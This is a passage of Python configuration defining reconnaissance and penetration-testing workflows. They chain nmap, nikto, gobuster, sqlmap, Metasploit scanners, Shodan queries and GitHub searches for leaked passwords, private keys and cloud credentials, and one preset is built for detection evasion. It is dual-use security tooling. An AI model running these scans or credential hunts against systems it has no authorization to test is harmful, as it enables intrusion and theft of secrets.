                            "query": "[TARGET_ORG] GCP_PROJECT OR google_credentials",
                            "sort": "new"
                        }
                    }
                ],
                "active_steps": [
                    {
                        "tool": "awsbucket",
                        "name": "S3 Bucket Enumeration",
                        "config": {
                            "bucket_list": "buckets.txt",
                            "threads": "10"
                        }
                    },
                    {
                        "tool": "nmap",
                        "name": "Cloud Service Ports",
                        "config": {
                            "scan_type": "SYN",
                            "ports": "22,80,443,3389,5985,5986,8080,8443",
                            "timing": "T4"
                        }
                    },
                    {
                        "tool": "gobuster",
                        "name": "Cloud Admin Panels",
                        "config": {
                            "mode": "dir",
                            "wordlist": "/usr/share/seclists/Discovery/Web-Content/common.txt",
                            "extensions": "html,php,json",
                            "threads": "30"
                        }
                    }
                ]
            },
            "quick_host": {
                "name": "Quick Host Discovery",
                "description": "Fast host reconnaissance",
                "passive_steps": [
                    {
                        "tool": "shodan",
                        "name": "Shodan Quick Lookup",
                        "config": {
                            "search_type": "host",
                            "query": "[TARGET_IP]"
                        }
                    },
                    {
                        "tool": "dnsrecon",
                        "name": "Quick DNS Lookup",
                        "config": {
                            "scan_type": "std"
                        }
                    }
                ],
                "active_steps": [
                    {
                        "tool": "nmap",
                        "name": "Fast Port Scan",
                        "config": {
                            "scan_type": "SYN",
                            "ports": "1-1000",
                            "timing": "T5"
                        }
                    },
                    {
                        "tool": "nikto",
                        "name": "Quick Web Scan",
                        "config": {
                            "port": "80",
                            "ssl": False,
                            "tuning": "124"
                        },
                        "condition": "http_detected"
                    }
                ]
            },
            "ad_recon": {
                "name": "Active Directory Reconnaissance",
                "description": "Full AD enumeration: LDAP → Kerberos → SMB → Users",
                "passive_steps": [
                    {
                        "tool": "shodan",
                        "name": "AD Services Search",
                        "config": {
                            "search_type": "search",
                            "query": "port:389,636,88 ip:[TARGET_IP]"
                        }
                    },
                    {
                        "tool": "shodan",
                        "name": "Domain Controller Search",
                        "config": {
                            "search_type": "search",
                            "query": "hostname:[TARGET_DOMAIN] port:88"
                        }
                    },
                    {
                        "tool": "githarvester",
                        "name": "AD Credential Search",
                        "config": {
                            "query": "[TARGET_DOMAIN] domain\\\\admin OR ldap OR kerberos",
                            "sort": "new"
                        }
                    },
                    {
                        "tool": "dnsrecon",
                        "name": "AD DNS Records",
                        "config": {
                            "scan_type": "std"
                        }
                    }
                ],
                "active_steps": [
                    {
                        "tool": "nmap",
                        "name": "AD Services Scan",
                        "config": {
                            "scan_type": "SYN",
                            "ports": "53,88,135,139,389,445,464,636,3268,3269",
                            "timing": "T4",
                            "scripts": "ldap-rootdse,smb-os-discovery"
                        }
                    },
                    {
                        "tool": "enum4linux",
                        "name": "SMB/LDAP Enumeration",
                        "config": {
                            "all_enum": True
                        }
                    },
                    {
                        "tool": "metasploit",
                        "name": "LDAP Query",
                        "config": {
                            "module": "auxiliary/gather/ldap_query",
                            "threads": "5"
                        }
                    },
                    {
                        "tool": "metasploit",
                        "name": "Kerberos Enumeration",
                        "config": {
                            "module": "auxiliary/gather/kerberos_enumusers",
                            "threads": "5"
                        }
                    }
                ]
            },
            "web_pentest": {
                "name": "Web Application Pentesting",
                "description": "Complete web app assessment with vuln scanning",
                "passive_steps": [
                    {
                        "tool": "shodan",
                        "name": "Web Technology Intel",
                        "config": {
                            "search_type": "host",
                            "query": "[TARGET_IP]"
                        }
                    },
                    {
                        "tool": "shodan",
                        "name": "HTTP Fingerprint Search",
                        "config": {
                            "search_type": "search",
                            "query": "hostname:[TARGET_DOMAIN] http"
                        }
                    },
                    {
                        "tool": "githarvester",
                        "name": "Web App Source Search",
                        "config": {
                            "query": "[TARGET_DOMAIN] config OR database OR password",
                            "sort": "new"
                        }
                    }
                ],
                "active_steps": [
                    {
                        "tool": "nmap",
                        "name": "Web Service Detection",
                        "config": {
                            "scan_type": "SYN",
                            "ports": "80,443,8080,8443,8000,8888",
                            "timing": "T4",
                            "scripts": "http-headers,http-methods,http-title"
                        }
                    },
                    {
                        "tool": "nikto",
                        "name": "Web Vulnerability Scan",
                        "config": {
                            "port": "80",
                            "ssl": False,
                            "tuning": "x"
                        }
                    },
                    {
                        "tool": "gobuster",
                        "name": "Directory Discovery",
                        "config": {
                            "mode": "dir",
                            "wordlist": "/usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt",
                            "extensions": "php,asp,aspx,jsp,html,js",
                            "threads": "30"
                        }
                    },
                    {
                        "tool": "feroxbuster",
                        "name": "Deep Content Discovery",
                        "config": {
                            "wordlist": "/usr/share/seclists/Discovery/Web-Content/common.txt",
                            "extensions": "php,html,js,json,xml,txt,bak,old",
                            "threads": "50",
                            "depth": "4"
                        }
                    },
                    {
                        "tool": "gobuster",
                        "name": "Vhost Discovery",
                        "config": {
                            "mode": "vhost",
                            "wordlist": "/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt",
                            "threads": "20"
                        }
                    },
                    {
                        "tool": "sqlmap",
                        "name": "SQL Injection Testing",
                        "config": {
                            "level": "2",
                            "risk": "1",
                            "batch": True,
                            "forms": True
                        },
                        "condition": "http_detected"
                    }
                ]
            },
            "external_perimeter": {
                "name": "External Perimeter Assessment",
                "description": "External recon for red team operations",
                "passive_steps": [
                    {
                        "tool": "dnsrecon",
                        "name": "DNS Record Lookup",
                        "config": {
                            "scan_type": "std"
                        }
                    },
                    {
                        "tool": "shodan",
                        "name": "Internet Exposure Analysis",
                        "config": {
                            "search_type": "search",
                            "query": "hostname:[TARGET_DOMAIN]"
                        }
                    },
                    {
                        "tool": "shodan",
                        "name": "Organization Footprint",
                        "config": {
                            "search_type": "search",
                            "query": "org:[TARGET_ORG]"
                        }
                    },
                    {
                        "tool": "githarvester",
                        "name": "Code Leak Search",
                        "config": {
                            "query": "[TARGET_DOMAIN] password OR secret OR api_key",
                            "sort": "new"
                        }
                    }
                ],
                "active_steps": [
                    {
                        "tool": "dnsrecon",
                        "name": "Subdomain Brute Force",
                        "config": {
                            "scan_type": "brt",
                            "wordlist": "/usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt"
                        }
                    },
                    {
                        "tool": "nmap",
                        "name": "External Port Scan",
                        "config": {
                            "scan_type": "SYN",
                            "ports": "21,22,23,25,53,80,110,139,143,443,445,993,995,1433,3306,3389,5432,8080",
                            "timing": "T3"
                        }
                    },
                    {
                        "tool": "nikto",
                        "name": "Web Vulnerability Scan",
                        "config": {
                            "port": "80",
                            "ssl": False,
                            "tuning": "x"
                        },
                        "condition": "http_detected"
                    }
                ]
            },
            "internal_sweep": {
                "name": "Internal Network Sweep",
                "description": "Internal network discovery and enumeration",
                "passive_steps": [
                    {
                        "tool": "shodan",
                        "name": "Internal Range Intel",
                        "config": {
                            "search_type": "search",
                            "query": "net:[TARGET_RANGE]"
                        }
                    },
                    {
                        "tool": "githarvester",
                        "name": "Internal Network Docs",
                        "config": {
                            "query": "[TARGET_ORG] internal OR intranet OR 192.168 OR 10.0",
                            "sort": "new"
                        }
                    }
                ],
                "active_steps": [
                    {
                        "tool": "nmap",
                        "name": "Host Discovery",
                        "config": {
                            "scan_type": "Ping",
                            "ports": "",
                            "timing": "T4"
                        }
                    },
                    {
                        "tool": "nmap",
                        "name": "Service Enumeration",
                        "config": {
                            "scan_type": "SYN",
                            "ports": "21,22,23,25,53,80,88,110,135,139,143,389,443,445,636,1433,3306,3389,5432,5900,8080",
                            "timing": "T4",
                            "scripts": "default"
                        }
                    },
                    {
                        "tool": "enum4linux",
                        "name": "Windows Enumeration",
                        "config": {
                            "all_enum": True
                        },
                        "condition": "smb_detected"
                    },
                    {
                        "tool": "metasploit",
                        "name": "Service Version Scan",
                        "config": {
                            "module": "auxiliary/scanner/portscan/tcp",
                            "threads": "20"
                        }
                    }
                ]
            },
            "api_security": {
                "name": "API Security Assessment",
                "description": "REST API security testing workflow",
                "passive_steps": [
                    {
                        "tool": "shodan",
                        "name": "API Service Intel",
                        "config": {
                            "search_type": "host",
                            "query": "[TARGET_IP]"
                        }
                    },
                    {
                        "tool": "githarvester",
                        "name": "API Documentation Search",
                        "config": {
                            "query": "[TARGET_DOMAIN] swagger OR openapi OR api-docs",
                            "sort": "best"
                        }
                    },
                    {
                        "tool": "githarvester",
                        "name": "API Key Search",
                        "config": {
                            "query": "[TARGET_DOMAIN] api_key OR bearer OR authorization",
                            "sort": "new"
                        }
                    }
                ],
                "active_steps": [
                    {
                        "tool": "nmap",
                        "name": "API Endpoint Discovery",
                        "config": {
                            "scan_type": "SYN",
                            "ports": "80,443,8080,8443,3000,5000,8000",
                            "timing": "T4",
                            "scripts": "http-headers,http-methods"
                        }
                    },
                    {
                        "tool": "gobuster",
                        "name": "API Path Discovery",
                        "config": {
                            "mode": "dir",
                            "wordlist": "/usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt",
                            "extensions": "json",
                            "threads": "30"
                        }
                    },
                    {
                        "tool": "feroxbuster",
                        "name": "Deep API Enumeration",
                        "config": {
                            "wordlist": "/usr/share/seclists/Discovery/Web-Content/common.txt",
                            "extensions": "json,xml",
                            "threads": "40",
                            "depth": "3"
                        }
                    },
                    {
                        "tool": "nikto",
                        "name": "API Vulnerability Check",
                        "config": {
                            "port": "80",
                            "ssl": False,
                            "tuning": "3"
                        }
                    }
                ]
            },
            "credential_hunt": {
                "name": "Credential Hunting",
                "description": "Search for exposed credentials across services",
                "passive_steps": [
                    {
                        "tool": "githarvester",
                        "name": "GitHub Credential Search",
                        "config": {
                            "query": "[TARGET] password OR secret OR token OR api_key",
                            "sort": "new"
                        }
                    },
                    {
                        "tool": "githarvester",
                        "name": "Private Key Search",
                        "config": {
                            "query": "[TARGET] BEGIN RSA OR BEGIN PRIVATE OR id_rsa",
                            "sort": "new"
                        }
                    },
                    {
                        "tool": "shodan",
                        "name": "Exposed Service Search",
                        "config": {
                            "search_type": "search",
                            "query": "org:[TARGET_ORG] port:21,22,23,3306,5432,27017"
                        }
                    }
                ],
                "active_steps": [
                    {
                        "tool": "nmap",
                        "name": "Authentication Service Scan",
                        "config": {
                            "scan_type": "SYN",
                            "ports": "21,22,23,25,110,143,389,636,1433,3306,3389,5432,5900",
                            "timing": "T4",
                            "scripts": "ftp-anon,ssh-auth-methods,smtp-open-relay"
                        }
                    },
                    {
                        "tool": "metasploit",
                        "name": "Anonymous FTP Check",
                        "config": {
                            "module": "auxiliary/scanner/ftp/anonymous",
                            "threads": "10"
                        }
                    },
                    {
                        "tool": "gobuster",
                        "name": "Backup File Hunt",
                        "config": {
                            "mode": "dir",
                            "wordlist": "/usr/share/seclists/Discovery/Web-Content/common.txt",
                            "extensions": "bak,old,sql,zip,tar,gz,config,env",
                            "threads": "30"
                        }
                    }
                ]
            },
            "ssl_assessment": {
                "name": "SSL/TLS Assessment",
                "description": "Certificate and encryption testing",
                "passive_steps": [
                    {
                        "tool": "shodan",
                        "name": "SSL Certificate Analysis",
                        "config": {
                            "search_type": "host",
                            "query": "[TARGET_IP]"
                        }
                    },
                    {
                        "tool": "shodan",
                        "name": "SSL Certificate Search",
                        "config": {
                            "search_type": "search",
                            "query": "ssl.cert.subject.cn:[TARGET_DOMAIN]"
                        }
                    },
                    {
                        "tool": "githarvester",
                        "name": "Certificate Leak Search",
                        "config": {
                            "query": "[TARGET_DOMAIN] certificate OR ssl OR private key",
                            "sort": "new"
                        }
                    }
                ],
                "active_steps": [
                    {
                        "tool": "nmap",
                        "name": "SSL Service Discovery",
                        "config": {
                            "scan_type": "SYN",
                            "ports": "443,465,636,989,990,993,995,8443",
                            "timing": "T4",
                            "scripts": "ssl-cert,ssl-enum-ciphers,ssl-known-key"
                        }
                    },
                    {
                        "tool": "nikto",
                        "name": "HTTPS Vulnerability Scan",
                        "config": {
                            "port": "443",
                            "ssl": True,
                            "tuning": "x"
                        }
                    }
                ]
            },
            "service_audit": {
                "name": "Network Services Audit",
                "description": "Comprehensive service enumeration",
                "passive_steps": [
                    {
                        "tool": "shodan",
                        "name": "Service Intelligence",
                        "config": {
                            "search_type": "host",
                            "query": "[TARGET_IP]"
                        }
                    },
                    {
                        "tool": "shodan",
                        "name": "Port History Search",
                        "config": {
                            "search_type": "search",
                            "query": "ip:[TARGET_IP]"
                        }
                    }
                ],
                "active_steps": [
                    {
                        "tool": "nmap",
                        "name": "Full Port Scan",
                        "config": {
                            "scan_type": "SYN",
                            "ports": "1-65535",
                            "timing": "T4"
                        }
                    },
                    {
                        "tool": "nmap",
                        "name": "Service Version Detection",
                        "config": {
                            "scan_type": "Version",
                            "ports": "1-1000",
                            "timing": "T3",
                            "scripts": "default,vuln"
                        }
                    },
                    {
                        "tool": "nikto",
                        "name": "Web Service Audit",
                        "config": {
                            "port": "80",
                            "ssl": False,
                            "tuning": "x"
                        },
                        "condition": "http_detected"
                    },
                    {
                        "tool": "enum4linux",
                        "name": "SMB Service Audit",
                        "config": {
                            "all_enum": True
                        },
                        "condition": "smb_detected"
                    },
                    {
                        "tool": "metasploit",
                        "name": "SSH Version Check",
                        "config": {
                            "module": "auxiliary/scanner/ssh/ssh_version",
                            "threads": "10"
                        },
                        "condition": "ssh_detected"
                    }
                ]
            },
            "stealth_recon": {
                "name": "Stealth Reconnaissance",
                "description": "Low and slow recon for evading detection",
                "passive_steps": [
                    {
                        "tool": "dnsrecon",
                        "name": "Passive DNS Lookup",
                        "config": {
                            "scan_type": "std"
                        }
                    },
                    {
                        "tool": "shodan",
                        "name": "Passive Infrastructure Intel",
                        "config": {
                            "search_type": "host",
                            "query": "[TARGET_IP]"
                        }
                    },
                    {
                        "tool": "githarvester",
                        "name": "Passive OSINT",
                        "config": {
                            "query": "[TARGET_DOMAIN]",
                            "sort": "best"
                        }
                    }
                ],
                "active_steps": [
                    {
                        "tool": "nmap",
                        "name": "Stealth Port Scan",
                        "config": {
                            "scan_type": "SYN",
                            "ports": "21,22,23,25,53,80,110,139,143,443,445,3389",
                            "timing": "T1"
                        }
                    }
                ]
            },
            "full_stack": {
                "name": "Full Stack Assessment",
                "description": "Complete infrastructure assessment",
                "passive_steps": [
                    {"tool": "dnsrecon", "name": "DNS Intelligence", "config": {"scan_type": "std"}},
                    {"tool": "shodan", "name": "Threat Intelligence", "config": {"search_type": "host", "query": "[TARGET_IP]"}},
                    {"tool": "githarvester", "name": "Code Repository Search", "config": {"query": "[TARGET_DOMAIN]", "sort": "new"}}
                ],
                "active_steps": [
                    {"tool": "nmap", "name": "Comprehensive Port Scan", "config": {"scan_type": "SYN", "ports": "1-10000", "timing": "T4", "scripts": "default"}},
                    {"tool": "nikto", "name": "Web Application Scan", "config": {"port": "80", "ssl": False, "tuning": "x"}, "condition": "http_detected"},
                    {"tool": "gobuster", "name": "Content Discovery", "config": {"mode": "dir", "wordlist": "/usr/share/seclists/Discovery/Web-Content/big.txt", "extensions": "php,html,asp,aspx,jsp,txt,bak", "threads": "40"}, "condition": "http_detected"},
                    {"tool": "enum4linux", "name": "Windows Enumeration", "config": {"all_enum": True}, "condition": "smb_detected"}
                ]
            },
            "vuln_assessment": {
                "name": "Vulnerability Assessment",
                "description": "Comprehensive vulnerability scanning",
                "passive_steps": [
                    {"tool": "shodan", "name": "Known Vulnerability Search", "config": {"search_type": "host", "query": "[TARGET_IP]"}},
                    {"tool": "shodan", "name": "CVE Search", "config": {"search_type": "search", "query": "vuln:CVE ip:[TARGET_IP]"}}
                ],
                "active_steps": [
                    {"tool": "nmap", "name": "Vulnerability Scan", "config": {"scan_type": "SYN", "ports": "1-1000", "timing": "T4", "scripts": "vuln"}},
                    {"tool": "nikto", "name": "Web Vulnerability Scan", "config": {"port": "80", "ssl": False, "tuning": "x"}, "condition": "http_detected"},
                    {"tool": "metasploit", "name": "SMB Vulnerability Check", "config": {"module": "auxiliary/scanner/smb/smb_ms17_010", "threads": "10"}, "condition": "smb_detected"}
                ]
            },
            "database_hunt": {
                "name": "Database Discovery",
                "description": "Find and enumerate database services",
                "passive_steps": [
                    {"tool": "shodan", "name": "Exposed Database Search", "config": {"search_type": "search", "query": "org:[TARGET_ORG] port:3306,5432,27017"}},
                    {"tool": "githarvester", "name": "Database Credential Search", "config": {"query": "[TARGET] mysql OR postgres OR mongodb password", "sort": "new"}}
                ],
                "active_steps": [
                    {"tool": "nmap", "name": "Database Port Scan", "config": {"scan_type": "SYN", "ports": "1433,1521,3306,5432,5984,6379,9042,27017,28017", "timing": "T4", "scripts": "mysql-info,ms-sql-info,oracle-tns-version"}},
                    {"tool": "metasploit", "name": "MySQL Enumeration", "config": {"module": "auxiliary/scanner/mysql/mysql_version", "threads": "10"}},
                    {"tool": "metasploit", "name": "MSSQL Enumeration", "config": {"module": "auxiliary/scanner/mssql/mssql_ping", "threads": "10"}}
                ]
            },
            "mail_server_recon": {
                "name": "Mail Server Reconnaissance",
                "description": "Email infrastructure enumeration",
                "passive_steps": [
                    {"tool": "dnsrecon", "name": "MX Record Lookup", "config": {"scan_type": "std"}},
                    {"tool": "shodan", "name": "Mail Server Intelligence", "config": {"search_type": "search", "query": "hostname:[TARGET_DOMAIN] port:25,587"}}
                ],
                "active_steps": [
                    {"tool": "nmap", "name": "Mail Service Scan", "config": {"scan_type": "SYN", "ports": "25,110,143,465,587,993,995", "timing": "T4", "scripts": "smtp-commands,smtp-enum-users,pop3-capabilities,imap-capabilities"}},
                    {"tool": "metasploit", "name": "SMTP User Enumeration", "config": {"module": "auxiliary/scanner/smtp/smtp_enum", "threads": "5"}}
                ]
            },
            "sqli_assessment": {
                "name": "SQL Injection Assessment",
                "description": "Complete SQLi testing",
                "passive_steps": [
                    {"tool": "shodan", "name": "Web Service Intel", "config": {"search_type": "host", "query": "[TARGET_IP]"}},
                    {"tool": "githarvester", "name": "SQLi Vector Search", "config": {"query": "[TARGET_DOMAIN] sql injection OR sqli", "sort": "new"}}
                ],
                "active_steps": [
                    {"tool": "nmap", "name": "Web Service Discovery", "config": {"scan_type": "SYN", "ports": "80,443,8080,8443,3306,5432,1433,1521", "timing": "T4", "scripts": "http-sql-injection"}},
                    {"tool": "nikto", "name": "Web Application Scan", "config": {"port": "80", "ssl": False, "tuning": "9"}, "condition": "http_detected"},
                    {"tool": "gobuster", "name": "Find Dynamic Pages", "config": {"mode": "dir", "wordlist": "/usr/share/seclists/Discovery/Web-Content/common.txt", "extensions": "php,asp,aspx,jsp,cgi", "threads": "20"}, "condition": "http_detected"},
                    {"tool": "sqlmap", "name": "SQL Injection Test", "config": {"level": "3", "risk": "2", "batch": True, "forms": True, "dbs": True}, "condition": "http_detected"}
                ]
            },
            "network_mapper": {
                "name": "Complete Network Mapper",
                "description": "Full network topology mapping",
                "passive_steps": [
                    {"tool": "shodan", "name": "External Intelligence", "config": {"search_type": "host", "query": "[TARGET_IP]"}},
                    {"tool": "shodan", "name": "Network Range Intel", "config": {"search_type": "search", "query": "net:[TARGET_RANGE]"}}
                ],
                "active_steps": [
                    {"tool": "nmap", "name": "Host Discovery", "config": {"scan_type": "SYN", "ports": "1-1000", "timing": "T4", "scripts": "default"}},
                    {"tool": "nmap", "name": "Full Port Scan", "config": {"scan_type": "SYN", "ports": "1-65535", "timing": "T4"}},
                    {"tool": "nmap", "name": "Service Fingerprinting", "config": {"scan_type": "Version", "ports": "1-10000", "timing": "T3", "scripts": "banner,version"}}
                ]
            },
            "web_vuln_hunter": {
                "name": "Web Vulnerability Hunter",
                "description": "Comprehensive web vulnerability assessment",
                "passive_steps": [
                    {"tool": "shodan", "name": "Web Tech Intel", "config": {"search_type": "host", "query": "[TARGET_IP]"}},
                    {"tool": "githarvester", "name": "Web Vuln Search", "config": {"query": "[TARGET_DOMAIN] vulnerability OR exploit", "sort": "new"}}
                ],
                "active_steps": [
                    {"tool": "nmap", "name": "Web Service Detection", "config": {"scan_type": "SYN", "ports": "80,443,8080,8443,8000,8888,3000,5000,9000", "timing": "T4", "scripts": "http-headers,http-methods,http-title,http-enum"}},
                    {"tool": "nikto", "name": "Vulnerability Scan", "config": {"port": "80", "ssl": False, "tuning": "x"}},
                    {"tool": "gobuster", "name": "Directory Discovery", "config": {"mode": "dir", "wordlist": "/usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt", "extensions": "php,asp,aspx,jsp,html,js,txt,xml,json,bak,old,sql", "threads": "50"}},
                    {"tool": "feroxbuster", "name": "Deep Recursive Scan", "config": {"wordlist": "/usr/share/seclists/Discovery/Web-Content/common.txt", "extensions": "php,html,js,json", "threads": "50", "depth": "5"}},
                    {"tool": "sqlmap", "name": "SQL Injection Testing", "config": {"level": "5", "risk": "3", "batch": True, "forms": True, "random_agent": True, "dbs": True}}
                ]
            },
            "osint_gather": {
                "name": "OSINT Intelligence Gathering",
                "description": "Open source intelligence collection",
                "passive_steps": [
                    {"tool": "dnsrecon", "name": "DNS Intelligence", "config": {"scan_type": "std"}},
                    {"tool": "githarvester", "name": "GitHub Intelligence", "config": {"query": "[TARGET_DOMAIN]", "sort": "best"}},
                    {"tool": "shodan", "name": "Infrastructure Intel", "config": {"search_type": "search", "query": "hostname:[TARGET_DOMAIN]"}},
                    {"tool": "shodan", "name": "Organization Search", "config": {"search_type": "search", "query": "org:[TARGET_ORG]"}}
                ],
                "active_steps": [
                    {"tool": "dnsrecon", "name": "Subdomain Discovery", "config": {"scan_type": "brt", "wordlist": "/usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt"}},
                    {"tool": "gobuster", "name": "DNS Brute Force", "config": {"mode": "dns", "wordlist": "/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt", "threads": "30"}}
                ]
            },
            "password_hunt": {
                "name": "Password & Secret Hunter",
                "description": "Hunt for exposed passwords and secrets",
                "passive_steps": [
                    {"tool": "githarvester", "name": "GitHub Password Search", "config": {"query": "[TARGET] password OR passwd OR secret OR api_key", "sort": "new"}},
                    {"tool": "githarvester", "name": "GitHub Key Search", "config": {"query": "[TARGET] AWS_ACCESS_KEY OR PRIVATE_KEY OR BEGIN RSA", "sort": "new"}},
                    {"tool": "shodan", "name": "Exposed Services", "config": {"search_type": "search", "query": "org:[TARGET_ORG] ftp OR telnet"}}
                ],
                "active_steps": [
                    {"tool": "gobuster", "name": "Backup File Discovery", "config": {"mode": "dir", "wordlist": "/usr/share/seclists/Discovery/Web-Content/common.txt", "extensions": "bak,old,backup,sql,tar,gz,zip,config,conf,cfg,env", "threads": "30"}, "condition": "http_detected"},
                    {"tool": "nmap", "name": "Anonymous FTP Check", "config": {"scan_type": "SYN", "ports": "21", "timing": "T4", "scripts": "ftp-anon,ftp-brute"}},
                    {"tool": "metasploit", "name": "FTP Anonymous Access", "config": {"module": "auxiliary/scanner/ftp/anonymous", "threads": "10"}}
                ]
            },
            "infrastructure_map": {
                "name": "Infrastructure Mapping",
                "description": "Map complete IT infrastructure",
                "passive_steps": [
                    {"tool": "dnsrecon", "name": "DNS Mapping", "config": {"scan_type": "std"}},
                    {"tool": "shodan", "name": "Internet Exposure", "config": {"search_type": "host", "query": "[TARGET_IP]"}}
                ],
                "active_steps": [
                    {"tool": "nmap", "name": "Network Discovery", "config": {"scan_type": "SYN", "ports": "21,22,23,25,53,80,110,135,139,143,443,445,993,995,1433,3306,3389,5432,8080", "timing": "T4", "scripts": "default"}},
                    {"tool": "enum4linux", "name": "Windows Infrastructure", "config": {"all_enum": True}},
                    {"tool": "metasploit", "name": "SSH Version Detection", "config": {"module": "auxiliary/scanner/ssh/ssh_version", "threads": "10"}}
                ]
            },
            "api_pentest": {
                "name": "API Penetration Testing",
                "description": "Comprehensive API security testing",
                "passive_steps": [
                    {"tool": "shodan", "name": "API Intel", "config": {"search_type": "host", "query": "[TARGET_IP]"}},
                    {"tool": "githarvester", "name": "API Docs Search", "config": {"query": "[TARGET_DOMAIN] swagger OR openapi OR api", "sort": "best"}}
                ],
                "active_steps": [
                    {"tool": "nmap", "name": "API Endpoint Discovery", "config": {"scan_type": "SYN", "ports": "80,443,8080,8443,3000,5000,8000,9000", "timing": "T4", "scripts": "http-methods"}},
                    {"tool": "gobuster", "name": "API Path Discovery", "config": {"mode": "dir", "wordlist": "/usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt", "extensions": "json,xml", "threads": "30"}},
                    {"tool": "feroxbuster", "name": "Deep API Enumeration", "config": {"wordlist": "/usr/share/seclists/Discovery/Web-Content/common.txt", "extensions": "json,xml,yaml", "threads": "40", "depth": "4"}},
                    {"tool": "nikto", "name": "API Vulnerability Check", "config": {"port": "80", "ssl": False, "tuning": "3"}},
                    {"tool": "sqlmap", "name": "API SQLi Testing", "config": {"level": "3", "risk": "2", "batch": True, "random_agent": True}}
                ]
            },
            "subdomain_hunter": {
                "name": "Subdomain Hunter",
                "description": "Aggressive subdomain enumeration",
                "passive_steps": [
                    {"tool": "dnsrecon", "name": "Standard DNS Enum", "config": {"scan_type": "std"}},
                    {"tool": "shodan", "name": "Subdomain Intelligence", "config": {"search_type": "search", "query": "hostname:[TARGET_DOMAIN]"}},
                    {"tool": "shodan", "name": "SSL Cert Subdomains", "config": {"search_type": "search", "query": "ssl.cert.subject.cn:[TARGET_DOMAIN]"}}
                ],
                "active_steps": [
                    {"tool": "dnsrecon", "name": "Subdomain Brute Force", "config": {"scan_type": "brt", "wordlist": "/usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt"}},
                    {"tool": "dnsrecon", "name": "Zone Transfer Attempt", "config": {"scan_type": "axfr"}},
                    {"tool": "gobuster", "name": "DNS Brute Force", "config": {"mode": "dns", "wordlist": "/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt", "threads": "30"}}
                ]
            },
            "cloud_pentest": {
                "name": "Cloud Security Audit",
                "description": "Comprehensive cloud security assessment",
                "passive_steps": [
                    {"tool": "githarvester", "name": "Cloud Credential Search", "config": {"query": "[TARGET] AWS_ACCESS OR AZURE_CLIENT OR GCP_PROJECT", "sort": "new"}},
                    {"tool": "shodan", "name": "Cloud Infrastructure", "config": {"search_type": "search", "query": "org:[TARGET_ORG] cloud"}}
                ],
                "active_steps": [
                    {"tool": "awsbucket", "name": "S3 Bucket Enumeration", "config": {"bucket_list": "buckets.txt", "threads": "10"}},
                    {"tool": "nmap", "name": "Cloud Service Scan", "config": {"scan_type": "SYN", "ports": "22,80,443,3389,5985,5986,8080,8443", "timing": "T4", "scripts": "default"}}
                ]
            },
            "red_team_initial": {
                "name": "Red Team Initial Access",
                "description": "Initial access reconnaissance for red team",
                "passive_steps": [
                    {"tool": "dnsrecon", "name": "Passive DNS", "config": {"scan_type": "std"}},
                    {"tool": "shodan", "name": "External Footprint", "config": {"search_type": "search", "query": "org:[TARGET_ORG]"}},
                    {"tool": "githarvester", "name": "Code Repository Intel", "config": {"query": "[TARGET_ORG]", "sort": "best"}}
                ],
                "active_steps": [
                    {"tool": "nmap", "name": "Perimeter Scan", "config": {"scan_type": "SYN", "ports": "21,22,23,25,53,80,110,443,445,3389,8080", "timing": "T3", "scripts": "vuln"}},
                    {"tool": "nikto", "name": "Web Vulnerability Check", "config": {"port": "80", "ssl": False, "tuning": "x"}, "condition": "http_detected"},
                    {"tool": "metasploit", "name": "SMB Vulnerability Check", "config": {"module": "auxiliary/scanner/smb/smb_ms17_010", "threads": "5"}}
                ]
            },
            "blue_team_audit": {
                "name": "Blue Team Security Audit",
                "description": "Defensive security assessment",
                "passive_steps": [
                    {"tool": "shodan", "name": "External Exposure Check", "config": {"search_type": "host", "query": "[TARGET_IP]"}},
                    {"tool": "shodan", "name": "Vulnerability Intel", "config": {"search_type": "search", "query": "vuln:CVE ip:[TARGET_IP]"}}
                ],
                "active_steps": [
                    {"tool": "nmap", "name": "Port Audit", "config": {"scan_type": "SYN", "ports": "1-65535", "timing": "T4"}},
                    {"tool": "nmap", "name": "Vulnerability Audit", "config": {"scan_type": "SYN", "ports": "1-10000", "timing": "T4", "scripts": "vuln"}},
                    {"tool": "nikto", "name": "Web Security Audit", "config": {"port": "80", "ssl": False, "tuning": "x"}, "condition": "http_detected"},
                    {"tool": "enum4linux", "name": "SMB Security Audit", "config": {"all_enum": True}}
                ]
            },
            # ============================================
            # NEW POWERFUL PENTESTING WORKFLOWS
            # ============================================
            "bug_bounty_recon": {
                "name": "Bug Bounty Recon",
                "description": "Comprehensive bug bounty reconnaissance workflow",
                "passive_steps": [
                    {"tool": "dnsrecon", "name": "DNS Enumeration", "config": {"scan_type": "std"}},
                    {"tool": "shodan", "name": "Infrastructure Recon", "config": {"search_type": "search", "query": "hostname:[TARGET_DOMAIN]"}},
                    {"tool": "shodan", "name": "SSL Certificate Search", "config": {"search_type": "search", "query": "ssl.cert.subject.cn:[TARGET_DOMAIN]"}},
                    {"tool": "shodan", "name": "Historical Data Search", "config": {"search_type": "search", "query": "ssl:[TARGET_DOMAIN]"}},
                    {"tool": "githarvester", "name": "GitHub Code Leaks", "config": {"query": "[TARGET_DOMAIN] api_key OR password OR secret OR token", "sort": "new"}},
                    {"tool": "githarvester", "name": "Config File Search", "config": {"query": "[TARGET_DOMAIN] .env OR config OR credentials", "sort": "new"}}
                ],
                "active_steps": [
                    {"tool": "dnsrecon", "name": "Subdomain Brute Force", "config": {"scan_type": "brt", "wordlist": "/usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt"}},
                    {"tool": "gobuster", "name": "VHost Discovery", "config": {"mode": "vhost", "wordlist": "/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt", "threads": "40"}},
                    {"tool": "nmap", "name": "Port Discovery", "config": {"scan_type": "SYN", "ports": "80,443,8080,8443,8000,3000,5000,9000,9443,4443", "timing": "T4", "scripts": "http-title,http-headers"}},
                    {"tool": "gobuster", "name": "Directory Discovery", "config": {"mode": "dir", "wordlist": "/usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt", "extensions": "php,asp,aspx,jsp,html,js,json,xml,txt,bak,old,zip", "threads": "50"}},
